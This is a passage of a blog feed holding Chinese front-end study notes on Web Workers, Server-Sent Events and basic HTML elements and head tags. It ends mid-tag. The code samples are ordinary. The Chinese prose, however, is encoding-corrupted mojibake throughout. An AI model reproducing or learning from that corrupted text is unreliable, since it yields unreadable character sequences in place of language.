èµ„æºçš„ä»»åŠ¡ã€‚</p><p>ç”±äº web worker ä½äºå¤–éƒ¨æ–‡ä»¶ä¸­ï¼Œå®ƒä»¬æ— æ³•è®¿é—®ä¸‹ä¾‹ JavaScript å¯¹è±¡ï¼š</p><ul><li>window å¯¹è±¡</li><li>document å¯¹è±¡</li><li>parent å¯¹è±¡</li></ul><p>é¦–å…ˆéœ€è¦<strong>åˆ›å»ºä¸€ä¸ª web worker æ–‡ä»¶</strong>ï¼Œæ¯”å¦‚è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªè®¡æ•°çš„è„šæœ¬ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">timedCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">postMessage</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"timedCount()"</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">timedCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å…¶ä¸­çš„ <code>postMessage()</code> æ–¹æ³•<strong>ç”¨äºå‘ HTML é¡µé¢ä¼ å›ä¸€æ®µæ¶ˆæ¯</strong>ã€‚</p><p>è€Œååœ¨ HTML ä¸­<strong>åˆ›å»ºä¸€ä¸ª Web Worker å¯¹è±¡</strong>ï¼Œè¿è¡Œä¸Šé¢æ–‡ä»¶ä¸­çš„ä»£ç ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">w <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">"demo_workers.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ç„¶åè®© Web Worker ç›‘å¬ <code>onmessage</code> äº‹ä»¶ã€‚</p><p>å½“ web worker ä¼ é€æ¶ˆæ¯æ—¶ï¼Œä¼šæ‰§è¡Œäº‹ä»¶ç›‘å¬å™¨ä¸­çš„ä»£ç ã€‚æ¥è‡ª web worker çš„æ•°æ®ä¼šå­˜å‚¨äº event.data ä¸­ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">w<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>åˆ›å»º web worker åï¼Œå®ƒä¼šç»§ç»­ç›‘å¬æ¶ˆæ¯ï¼ˆå³ä½¿åœ¨å¤–éƒ¨è„šæœ¬å®Œæˆåï¼‰ç›´åˆ°å…¶è¢«ç»ˆæ­¢ä¸ºæ­¢ã€‚</p><p>éœ€è¦ç»ˆæ­¢è¿™ä¸ª web workerï¼Œå¹¶é‡Šæ”¾æµè§ˆå™¨/è®¡ç®—æœºèµ„æºï¼Œå¯ä»¥ä½¿ç”¨ terminate() æ–¹æ³•ã€‚</p><p>ç»ˆæ­¢åå†å°†åŸæ¥çš„å˜é‡ï¼ˆwï¼‰è®¾ç½®ä¸º <code>undefined</code>ï¼Œåˆ™åˆå¯ä»¥å¤ç”¨ä»£ç å•¦ï¼</p><p>HTMLä¸­çš„å®Œæ•´ä»£ç å¦‚ä¸‹ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Count numbers: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>output</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startWorker()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Start Worker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stopWorker()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Stop Worker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> w<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">startWorker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Worker<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            w <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">"demo_workers.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        w<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"Sorry! No Web Worker support."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">stopWorker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     w<span class="token punctuation">.</span><span class="token function">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    w <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><br><hr><h2 id="Server-Sent-äº‹ä»¶"><a href="#Server-Sent-äº‹ä»¶" class="headerlink" title="Server-Sent äº‹ä»¶"></a>Server-Sent äº‹ä»¶</h2><p>Server-Sent äº‹ä»¶<em>ï¼ˆSSEï¼‰</em>æŒ‡çš„æ˜¯ç½‘é¡µè‡ªåŠ¨ä»æœåŠ¡å™¨è·å¾—æ›´æ–°ã€‚</p><p><strong>EventSource å¯¹è±¡ç”¨äºæ¥æ”¶æœåŠ¡å™¨å‘é€äº‹ä»¶é€šçŸ¥ã€‚</strong></p><p>å®ƒæœ‰è¿™å‡ ç§æ–¹æ³•ï¼š</p><table><thead><tr><th>äº‹ä»¶</th><th>æè¿°</th></tr></thead><tbody><tr><td>onopen</td><td>å½“é€šå¾€æœåŠ¡å™¨çš„è¿æ¥è¢«æ‰“å¼€</td></tr><tr><td>onmessage</td><td>å½“æ¥æ”¶åˆ°æ¶ˆæ¯</td></tr><tr><td>onerror</td><td>å½“å‘ç”Ÿé”™è¯¯</td></tr></tbody></table><p>æœ€å¸¸ç”¨çš„å°± <code>onmessage</code> æ–¹æ³•ã€‚</p><pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var source = new EventSource("demo_sse.php");source.onmessage = function(event) {    document.getElementById("result").innerHTML += event.data + "&lt;br&gt;";};</code></pre><p>è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ª EventSource å¯¹è±¡ï¼Œç„¶åè§„å®šå‘é€æ›´æ–°çš„é¡µé¢çš„ URLï¼ˆâ€demo_sse.phpâ€ï¼‰ã€‚</p><p>æ¯å½“æ¥æ”¶åˆ°ä¸€æ¬¡æ›´æ–°ï¼Œå°±ä¼šå‘ç”Ÿ onmessage äº‹ä»¶ï¼ŒæŠŠå·²æ¥æ”¶çš„æ•°æ®æ¨å…¥ id ä¸º â€œresultâ€ çš„å…ƒç´ ä¸­ã€‚</p><p>æœ€å¥½å†åŠ ä¸€ä¸ªåˆ¤æ–­ï¼Œçœ‹çœ‹æµè§ˆå™¨æ˜¯å¦æ”¯æŒSSEã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>result<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>EventSource<span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"undefined"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">var</span> source<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">EventSource</span><span class="token punctuation">(</span><span class="token string">"/example/html5/demo_sse.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        source<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">+=</span>event<span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token string">"&lt;br /&gt;"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"æŠ±æ­‰ï¼Œæ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ server-sent äº‹ä»¶ ..."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><p>æœåŠ¡å™¨ç«¯çš„è¯ï¼ŒæŠŠ <code>"Content-Type"</code> æŠ¥å¤´è®¾ç½®ä¸º <code>"text/event-stream"</code>ï¼Œå°±å¯ä»¥å¼€å§‹å‘é€äº‹ä»¶æµäº†ã€‚</p><br><br><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>HTML çš„éƒ¨åˆ†å¤§æ¦‚å°±å‘Šä¸€æ®µè½äº†ï¼Œå¦‚æœè¦å…·ä½“å­¦çš„è¯ï¼Œè¦æƒ³ææ¸…æ¥šæ¯ä¸ªå±æ€§çš„å«ä¹‰å°±æ„Ÿè§‰åœ¨çœ‹æ–‡æ¡£äº†ï¼Œæ„Ÿè§‰æ²¡æœ‰å¿…è¦ã€‚</p><p>è¿˜ä¸å¦‚ä¹‹åæœ‰ä¸ç†è§£çš„å†å›æ¥ç¿»ä¸€ç¿»ï¼Œæ›´ç‹­ä¹‰çš„çŸ¥è¯†ç‚¹ç›´æ¥æŸ¥æ–‡æ¡£å°±å¥½äº†å‘€ï¼</p><p>æ¥ä¸‹æ¥å°±æ…¢æ…¢çœ‹çœ‹ CSS å’Œ JavaScriptå¥½äº†ã€‚</p><p>æºœäº†æºœäº†ã€‚</p><p><small><em>ï¼ˆè¿™ä¸ªå¯’å‡å‡ºä¸äº†é—¨å¥½éš¾å—å•Šå˜¤å˜¤å˜¤</em>&nbsp;</small></p>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FrontEnd | HTML åŸºç¡€å…¥é—¨å­¦ä¹ ç¬”è®°</title>
      <link href="2020/02/14/FrontEnd_HTML_Basic/"/>
      <url>2020/02/14/FrontEnd_HTML_Basic/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘æƒ³<strong>ç³»ç»Ÿä¸€ç‚¹å­¦ä¸€å­¦å‰ç«¯</strong>ï¼Œè¿™ä¸€ç¯‡åšå®¢å°±ç®€è¦è®°å½•ä¸€äº›å‰ç«¯ä¸­ <strong>HTML åŸºç¡€å…¥é—¨</strong>çš„å­¦ä¹ ç¬”è®°å§ã€‚</p><p>çœ‹å®Œäº†å°ç”²é±¼ç›®å‰æ›´æ–°äº†çš„webå¼€å‘å…¥é—¨çš„è§†é¢‘ï¼Œè®²çš„è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œæ€»ä½“æ¥è¯´è¿˜ç®—æ¯”è¾ƒç³»ç»Ÿçš„ï¼Œè€Œä¸”<em>ç–‘è½¦æœ‰æ®</em>23333ã€‚</p><p>ä¸è¿‡æ„Ÿè§‰ä¸å¤Ÿå…¨é¢ï¼Œäºæ˜¯å†æ¥åˆ·äº†ä¸€é W3Schoolã€‚</p><p>åé¢å¿˜äº†è¿˜å¯ä»¥å†æ¥çœ‹çœ‹ï¼Œæˆ–è€…å†æŸ¥æ–‡æ¡£å°±å®Œäº‹äº†ã€‚ğŸ˜‚</p><p>å…¶å®å°±æ˜¯ç®€å•è¿‡ä¸€é23333 <em>ç±»ä¼¼äºæŠ„ä¸€éï¼ˆx</em></p><p><strong>è¿™ç¯‡æ–‡ç« è¶…é•¿é•¿é•¿é•¿é•¿é•¿é•¿é•¿â€¦â€¦</strong> æ‰€ä»¥å…ˆåšå¥½å‡†å¤‡ã€‚</p><p>ç”±äºæˆ‘çš„åšå®¢è‡ªå¸¦äº†ä¸€äº›CSSæ ·å¼ï¼Œ<strong>æ˜¾ç¤ºçš„æ•ˆæœå¯èƒ½å’Œé¢„è®¡çš„ä¸åŒï¼Œæœ€å¥½è¿˜æ˜¯å»ºä¸€ä¸ªæ–°çš„HTMLæ–‡ä»¶æ¥è¯•è¯•</strong>å§ã€‚</p><br><h3 id="ä¸€äº›å‚è€ƒçš„ç½‘ç«™"><a href="#ä¸€äº›å‚è€ƒçš„ç½‘ç«™" class="headerlink" title="ä¸€äº›å‚è€ƒçš„ç½‘ç«™"></a>ä¸€äº›å‚è€ƒçš„ç½‘ç«™</h3><p><a href="https://www.w3school.com.cn/html/index.asp">W3School HTML æ•™ç¨‹</a></p><p><a href="https://man.ilovefishc.com/html5/">é€ŸæŸ¥å®å…¸ï¼šHTML5 APIé€ŸæŸ¥ï¼ˆé±¼Cå·¥ä½œå®¤ï¼‰</a></p><p><a href="https://www.runoob.com/html/html-tutorial.html">HTML èœé¸Ÿæ•™ç¨‹</a></p><p>Bç«™è§†é¢‘ <em>ï¼ˆå°ç”²é±¼çš„è§†é¢‘å±…ç„¶è¿˜æ²¡æ›´æ–°å®Œï¼Œå‚¬æ›´ä¸€æ³¢</em></p><br><h2 id="æ•´ä½“æ¡†æ¶"><a href="#æ•´ä½“æ¡†æ¶" class="headerlink" title="æ•´ä½“æ¡†æ¶"></a>æ•´ä½“æ¡†æ¶</h2><p>HTML5</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>åœ¨VS Codeä¸­å¯ä»¥ç›´æ¥è¾“å…¥<code>html:5</code>ï¼ŒæŒ‰ä¸‹<code>Tab</code>é”®å³å¯è‡ªåŠ¨è¾“å…¥æ¨¡æ¿ã€‚ç”¨çš„æ˜¯ <strong>Emmet Abbreviation</strong>ã€‚</p><br><hr><p>ä¸‹é¢ä¸»è¦å‚è€ƒ <strong>W3School</strong> çš„æ•™ç¨‹ã€‚æ›´è¯¦ç»†çš„è¯·å‚è€ƒ<a href="https://www.w3school.com.cn/">å®˜ç½‘</a>ã€‚</p><h2 id="å…ƒç´ "><a href="#å…ƒç´ " class="headerlink" title="å…ƒç´ "></a>å…ƒç´ </h2><p><strong>HTML æ–‡æ¡£æ˜¯ç”± HTML å…ƒç´ å®šä¹‰çš„ã€‚</strong></p><p>å…ƒç´ æŒ‡çš„æ˜¯ä»<strong>å¼€å§‹æ ‡ç­¾ï¼ˆstart tagï¼‰</strong> <em>orå¼€æ”¾æ ‡ç­¾ï¼ˆopening tagï¼‰</em> åˆ°<strong>ç»“æŸæ ‡ç­¾ï¼ˆend tagï¼‰</strong> <em>oré—­åˆæ ‡ç­¾ï¼ˆclosing tagï¼‰</em> çš„æ‰€æœ‰ä»£ç ã€‚</p><p>ç©ºå…ƒç´ <strong>åœ¨å¼€å§‹æ ‡ç­¾ä¸­è¿›è¡Œå…³é—­</strong>ï¼ˆä»¥å¼€å§‹æ ‡ç­¾çš„ç»“æŸè€Œç»“æŸï¼‰ï¼Œå¦‚<code>&lt;br /&gt;</code>ã€‚è™½ç„¶å†™æˆ<code>&lt;br&gt;</code>ä¹Ÿè¡Œï¼Œä½†å»ºè®®éƒ½å…³é—­ã€‚</p><p>HTML æ ‡ç­¾å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼š<code>&lt;P&gt;</code> ç­‰åŒäº<code>&lt;p&gt;</code>ã€‚ä½†æ˜¯æ¨è/å¼ºåˆ¶ä½¿ç”¨<strong>å°å†™å­—æ¯</strong>ã€‚</p><br><h2 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h2><p><strong>å±æ€§ä¸º HTML å…ƒç´ æä¾›é™„åŠ ä¿¡æ¯ã€‚</strong></p><p>å±æ€§æ€»æ˜¯ä»¥åç§°/å€¼å¯¹çš„å½¢å¼å‡ºç°ï¼Œæ¯”å¦‚ï¼š<em>name=â€valueâ€<em>ã€‚æ€»æ˜¯åœ¨ HTML å…ƒç´ çš„</em></em>å¼€å§‹æ ‡ç­¾**ä¸­è§„å®šã€‚</p><p>å±æ€§å’Œå±æ€§å€¼å¯¹å¤§å°å†™<strong>ä¸æ•æ„Ÿ</strong>ã€‚ä½†æ¨èä½¿ç”¨<strong>å°å†™</strong>ã€‚</p><p>å±æ€§å€¼è¦åŒ…å«åœ¨å¼•å·å†…ï¼ŒåŒå¼•å·ã€å•å¼•å·å‡å¯ã€‚è‹¥å±æ€§å€¼æœ¬èº«å°±å«æœ‰åŒå¼•å·ï¼Œé‚£ä¹ˆå¿…é¡»ä½¿ç”¨å•å¼•å·â†“ã€‚</p><pre class="language-none"><code class="language-none">name='Bill "HelloWorld" Gates'</code></pre><p>å¸¸ç”¨çš„ HTML å±æ€§ï¼š</p><table><thead><tr><th>å±æ€§</th><th>å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>class</td><td><em>classname</em></td><td>è§„å®šå…ƒç´ çš„ç±»åï¼ˆclassnameï¼‰</td></tr><tr><td>id</td><td><em>id</em></td><td>è§„å®šå…ƒç´ çš„å”¯ä¸€ id</td></tr><tr><td>style</td><td><em>style_definition</em></td><td>è§„å®šå…ƒç´ çš„è¡Œå†…æ ·å¼ï¼ˆinline styleï¼‰</td></tr><tr><td>title</td><td><em>text</em></td><td>è§„å®šå…ƒç´ çš„é¢å¤–ä¿¡æ¯ï¼ˆå¯åœ¨å·¥å…·æç¤ºä¸­æ˜¾ç¤ºï¼‰</td></tr></tbody></table><br><h2 id="å¤´éƒ¨-head"><a href="#å¤´éƒ¨-head" class="headerlink" title="å¤´éƒ¨ head"></a>å¤´éƒ¨ head</h2><p><code>head</code>å…ƒç´ ä¸­å¯ä»¥åŒ…å«<code>&lt;title&gt;</code>ã€<code>&lt;base&gt;</code>ã€<code>&lt;link&gt;</code>ã€<code>&lt;meta&gt;</code>ã€<code>&lt;script&gt;</code> ä»¥åŠ <code>&lt;style&gt;</code>ã€‚</p><h3 id="title-å…ƒç´ "><a href="#title-å…ƒç´ " class="headerlink" title="title å…ƒç´ "></a>title å…ƒç´ </h3><p><code>&lt;title&gt;</code> æ ‡ç­¾å®šä¹‰æ–‡æ¡£çš„æ ‡é¢˜ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Title of the document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="base-å…ƒç´ "><a href="#base-å…ƒç´ " class="headerlink" title="base å…ƒç´ "></a>base å…ƒç´ </h3><p><code>&lt;base&gt;</code> æ ‡ç­¾ä¸ºé¡µé¢ä¸Šçš„æ‰€æœ‰é“¾æ¥è§„å®šé»˜è®¤åœ°å€æˆ–é»˜è®¤ç›®æ ‡ï¼ˆtargetï¼‰ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://miaotony.xyz/<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="link-å…ƒç´ "><a href="#link-å…ƒç´ " class="headerlink" title="link å…ƒç´ "></a>link å…ƒç´ </h3><p>å®šä¹‰æ–‡æ¡£ä¸å¤–éƒ¨èµ„æºä¹‹é—´çš„å…³ç³»ã€‚å¦‚æ ·å¼è¡¨ç­‰ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mystyle.css<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="style-å…ƒç´ "><a href="#style-å…ƒç´ " class="headerlink" title="style å…ƒç´ "></a>style å…ƒç´ </h3><p><code>&lt;style&gt;</code> æ ‡ç­¾ç”¨äºä¸º HTML æ–‡æ¡£å®šä¹‰æ ·å¼ä¿¡æ¯ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">        <span class="token selector">body</span> <span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span>yellow<span class="token punctuation">}</span>        <span class="token selector">p</span> <span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span>blue<span class="token punctuation">}</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="meta-å…ƒç´ "><a href="#meta-å…ƒç´ " class="headerlink" title="meta å…ƒç´ "></a>meta å…ƒç´ </h3><p>å…ƒæ•°æ®ï¼ˆmetadataï¼‰æ˜¯å…³äºæ•°æ®çš„ä¿¡æ¯ã€‚</p><p><code>&lt;meta&gt;</code> æ ‡ç­¾æä¾›å…³äº HTML æ–‡æ¡£çš„å…ƒæ•°æ®ã€‚å…ƒæ•°æ®ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œä½†æ˜¯å¯¹äºæœºå™¨æ˜¯å¯è¯»çš„ã€‚</p><p>å…¸å‹çš„æƒ…å†µæ˜¯ï¼Œmeta å…ƒç´ è¢«ç”¨äºè§„å®šé¡µé¢çš„æè¿°ã€å…³é”®è¯ã€æ–‡æ¡£çš„ä½œè€…ã€æœ€åä¿®æ”¹æ—¶é—´ä»¥åŠå…¶ä»–å…ƒæ•°æ®ã€‚</p><p><code>&lt;meta&gt;</code> æ ‡ç­¾å§‹ç»ˆä½äº head å…ƒç´ ä¸­ã€‚</p><p>å…ƒæ•°æ®å¯ç”¨äºæµè§ˆå™¨ï¼ˆå¦‚ä½•æ˜¾ç¤ºå†…å®¹æˆ–é‡æ–°åŠ è½½é¡µé¢ï¼‰ï¼Œæœç´¢å¼•æ“ï¼ˆå…³é”®è¯ï¼‰ï¼Œæˆ–å…¶ä»– web æœåŠ¡ã€‚</p><h4 